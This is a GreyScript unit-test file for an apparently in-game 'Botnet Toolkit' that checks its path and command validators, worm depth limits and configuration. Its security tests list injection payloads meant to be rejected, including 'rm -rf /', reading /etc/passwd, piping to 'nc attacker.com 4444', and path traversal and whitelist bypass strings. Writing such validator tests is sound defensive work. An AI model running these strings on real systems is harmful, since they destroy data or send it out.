// ============================================
// Unit Tests for Critical Functions
// Tests security and validation functions
// ============================================

// Test framework for GreyScript
test_results = []
test_count = 0

// Test assertion helper
assert = function(test_name, condition, expected, actual)
    test_count = test_count + 1
    if condition == null then condition = false
    if expected == null then expected = true
    
    if condition == expected then
        test_results.push("✓ PASS: " + test_name)
    else
        test_results.push("✗ FAIL: " + test_name + " (Expected: " + str(expected) + ", Got: " + str(actual) + ")")
    end if
end function

// Test safe_path function
test_safe_path = function()
    // Import the function to test
    import_code("/scripts/utils/botnet_config.gs")
    import_code("/bin/slave.gs")
    
    // Test 1: Null input
    assert("safe_path null input", globals.safe_path(null), false)
    
    // Test 2: Empty string
    assert("safe_path empty string", globals.safe_path(""), false)
    
    // Test 3: Path traversal attack
    assert("safe_path traversal attack", globals.safe_path("../../../etc/passwd"), false)
    
    // Test 4: Hidden traversal
    assert("safe_path hidden traversal", globals.safe_path("/root/.botnet/../etc/passwd"), false)
    
    // Test 5: Valid allowed path
    assert("safe_path valid botnet path", globals.safe_path("/root/.botnet/commands"), true)
    
    // Test 6: Valid script path
    assert("safe_path valid script path", globals.safe_path("/bin/slave.gs"), true)
    
    // Test 7: Suspicious characters
    assert("safe_path suspicious chars", globals.safe_path("/tmp/file;rm -rf /"), false)
    
    // Test 8: Double slash bypass
    assert("safe_path double slash", globals.safe_path("/root//.botnet/file"), false)
    
    // Test 9: Home directory reference
    assert("safe_path home directory", globals.safe_path("~/.ssh/authorized_keys"), false)
    
    // Test 10: Environment variable
    assert("safe_path env variable", globals.safe_path("/tmp/$HOME/file"), false)
end function

// Test validate_command function
test_validate_command = function()
    import_code("/scripts/utils/command_validation.gs")
    
    // Test 1: Null command
    assert("validate_command null", globals.validate_command(null), false)
    
    // Test 2: Empty command
    assert("validate_command empty", globals.validate_command(""), false)
    
    // Test 3: Valid run command
    assert("validate_command valid run", globals.validate_command("run /bin/slave.gs"), true)
    
    // Test 4: Invalid command
    assert("validate_command invalid", globals.validate_command("malicious_command"), false)
    
    // Test 5: Command with too many args
    long_cmd = "run /bin/slave.gs arg1 arg2 arg3 arg4 arg5 arg6"
    assert("validate_command too many args", globals.validate_command(long_cmd), false)
    
    // Test 6: Valid worm command
    assert("validate_command valid worm", globals.validate_command("worm /root/.botnet/master.pub 3"), true)
    
    // Test 7: Invalid worm depth
    assert("validate_command invalid worm depth", globals.validate_command("worm /root/.botnet/master.pub 15"), false)
    
    // Test 8: Valid status command
    assert("validate_command valid status", globals.validate_command("status"), true)
    
    // Test 9: Command with non-printable chars
    assert("validate_command non-printable", globals.validate_command("run\x00/bin/slave.gs"), false)
    
    // Test 10: Valid help command
    assert("validate_command valid help", globals.validate_command("help"), true)
end function

// Test validate_script_args function
test_validate_script_args = function()
    import_code("/scripts/utils/command_validation.gs")
    
    // Test 1: Valid script and args
    assert("validate_script_args valid", globals.validate_script_args("/bin/slave.gs", ["arg1", "arg2"]), true)
    
    // Test 2: Invalid script path
    assert("validate_script_args invalid script", globals.validate_script_args("/etc/passwd", ["arg1"]), false)
    
    // Test 3: Args with suspicious chars
    assert("validate_script_args suspicious args", globals.validate_script_args("/bin/slave.gs", ["arg;rm -rf /"]), false)
    
    // Test 4: Args too long
    long_arg = ""
    for i in range(0, 300)
        long_arg = long_arg + "a"
    end for
    assert("validate_script_args long arg", globals.validate_script_args("/bin/slave.gs", [long_arg]), false)
    
    // Test 5: Valid multiple args
    assert("validate_script_args multiple args", globals.validate_script_args("/bin/slave.gs", ["--verbose", "--debug", "target"]), true)
end function

// Test configuration system
test_botnet_config = function()
    import_code("/scripts/utils/botnet_config.gs")
    
    // Test 1: Load default config
    config = globals.load_botnet_config()
    assert("botnet_config load defaults", config != null, true)
    
    // Test 2: Get config value
    botnet_root = globals.get_config("paths.botnet_root")
    assert("botnet_config get botnet_root", botnet_root != null, "/root/.botnet")
    
    // Test 3: Get allowed scripts
    scripts = globals.get_config("security.allowed_scripts")
    assert("botnet_config get allowed scripts", scripts != null, true)
    
    // Test 4: Get depth cap
    depth_cap = globals.get_config("security.hard_depth_cap")
    assert("botnet_config get depth cap", depth_cap != null, 5)
    
    // Test 5: Invalid config path
    invalid = globals.get_config("invalid.path.key")
    assert("botnet_config invalid path", invalid, null)
end function

// Test Kyber key validation (in worm.gs)
test_master_pubkey_validation = function()
    import_code("/bin/worm.gs")
    
    // Test 1: Null file path
    assert("master_pubkey null path", globals.validate_master_pubkey(null), false)
    
    // Test 2: Empty file path
    assert("master_pubkey empty path", globals.validate_master_pubkey(""), false)
    
    // Test 3: Non-existent file
    assert("master_pubkey non-existent", globals.validate_master_pubkey("/non/existent/path"), false)
    
    // Test 4: Valid file (would need actual file for complete test)
    // This test would require creating a valid key file
    // For now, just test the path validation logic
    assert("master_pubkey path validation", globals.validate_master_pubkey("/root/.botnet/master.pub"), true)
end function

// Test retry_network function
test_retry_network = function()
    import_code("/bin/master_controller.gs")
    
    // Test 1: Function exists and is callable
    retry_func = globals.retry_network
    assert("retry_network function exists", typeof(retry_func) == "function", true)
    
    // Test 2: Default parameters
    // This would require actual network testing, so just test parameter handling
    assert("retry_network parameter handling", retry_func != null, true)
end function

// Test error formatting
test_format_error = function()
    import_code("/scripts/utils/command_validation.gs")
    
    // Test 1: Invalid command error
    error1 = globals.format_error("INVALID_COMMAND", "")
    assert("format_error invalid command", error1.indexOf("Type 'help'") != -1, true)
    
    // Test 2: Script not allowed error
    error2 = globals.format_error("SCRIPT_NOT_ALLOWED", "/bin/evil.gs")
    assert("format_error script not allowed", error2.indexOf("Script: /bin/evil.gs") != -1, true)
    
    // Test 3: Access denied error
    error3 = globals.format_error("ACCESS_DENIED", "/etc/passwd")
    assert("format_error access denied", error3.indexOf("Path: /etc/passwd") != -1, true)
    
    // Test 4: Network failed error
    error4 = globals.format_error("NETWORK_FAILED", "Connection timeout")
    assert("format_error network failed", error4.indexOf("Connection timeout") != -1, true)
end function

// Run all tests
run_all_tests = function()
    print("Running Unit Tests for Botnet Toolkit...")
    print("=" * 50)
    
    test_safe_path()
    test_validate_command()
    test_validate_script_args()
    test_botnet_config()
    test_master_pubkey_validation()
    test_retry_network()
    test_format_error()
    
    print("=" * 50)
    print("Test Results:")
    print("-" * 50)
    
    passed = 0
    failed = 0
    
    for result in test_results
        print(result)
        if result.indexOf("✓ PASS") == 0 then
            passed = passed + 1
        else
            failed = failed + 1
        end if
    end for
    
    print("-" * 50)
    print("Tests Run: " + str(test_count))
    print("Passed: " + str(passed))
    print("Failed: " + str(failed))
    print("Success Rate: " + str(floor((passed / test_count) * 100)) + "%")
    
    if failed == 0 then
        print(green("ALL TESTS PASSED ✓"))
    else
        print(red(failed + " TESTS FAILED ✗"))
    end if
end function

// Test help system
test_help_system = function()
    import_code("/scripts/utils/command_validation.gs")
    
    // Test 1: Help function exists
    help_func = globals.show_help
    assert("help function exists", typeof(help_func) == "function", true)
    
    // Test 2: Help returns proper format
    help_result = globals.show_help()
    assert("help function returns", help_result == "HELP_SHOWN", true)
end function

// Edge case tests
test_edge_cases = function()
    import_code("/scripts/utils/command_validation.gs")
    
    // Test 1: Command with maximum length
    max_cmd = "run /bin/slave.gs"
    for i in range(0, 900)
        max_cmd = max_cmd + "a"
    end for
    assert("edge case max command length", globals.validate_command(max_cmd), false)
    
    // Test 2: Path with mixed case traversal
    assert("edge case mixed traversal", globals.safe_path("/root/.botnet/../etc/passwd"), false)
    
    // Test 3: Script args with special characters
    assert("edge case special chars", globals.validate_script_args("/bin/slave.gs", ["arg$HOME"]), false)
    
    // Test 4: Unicode characters in paths
    assert("edge case unicode path", globals.safe_path("/tmp/文件.txt"), false)
    
    // Test 5: Command with tabs and newlines
    assert("edge case whitespace", globals.validate_command("run\t/bin/slave.gs\n"), false)
end function

// Security-focused tests
test_security = function()
    import_code("/scripts/utils/command_validation.gs")
    
    // Test 1: Command injection attempts
    injection_attempts = [
        "run /bin/slave.gs; rm -rf /",
        "run /bin/slave.gs && cat /etc/passwd",
        "run /bin/slave.gs | nc attacker.com 4444",
        "run /bin/slave.gs `whoami`",
        "run /bin/slave.gs $(id)"
    ]
    
    for injection in injection_attempts
        assert("security injection: " + injection, globals.validate_command(injection), false)
    end for
    
    // Test 2: Path traversal variants
    traversal_attempts = [
        "/root/.botnet/../../../etc/passwd",
        "/root/.botnet/..\\..\\..\\etc\\passwd",
        "/root/.botnet/%2e%2e%2fetc%2fpasswd",
        "/root/.botnet/....//....//etc/passwd"
    ]
    
    for traversal in traversal_attempts
        assert("security traversal: " + traversal, globals.safe_path(traversal), false)
    end for
    
    // Test 3: Script whitelist bypass attempts
    bypass_attempts = [
        "/bin/../bin/slave.gs",
        "/bin/slave.sh",
        "/bin/slave.bak",
        "/bin/slave.exe",
        "/etc/../bin/slave.gs"
    ]
    
    for bypass in bypass_attempts
        assert("security bypass: " + bypass, globals.validate_script_args(bypass, []), false)
    end for
end function

// Main test runner
main = function()
    print("Botnet Toolkit Unit Test Suite")
    print("================================")
    print("Testing critical security and validation functions")
    print()
    
    run_all_tests()
    
    print()
    print("Running Security Tests...")
    print("-" * 30)
    test_security()
    
    print()
    print("Running Edge Case Tests...")
    print("-" * 30)
    test_edge_cases()
    
    print()
    print("Running Help System Tests...")
    print("-" * 30)
    test_help_system()
    
    print()
    print("Test suite completed.")
    print("Run this script regularly to verify system integrity.")
end function

// Auto-run tests if executed directly
if get_shell.launch == null then
    main()
end if
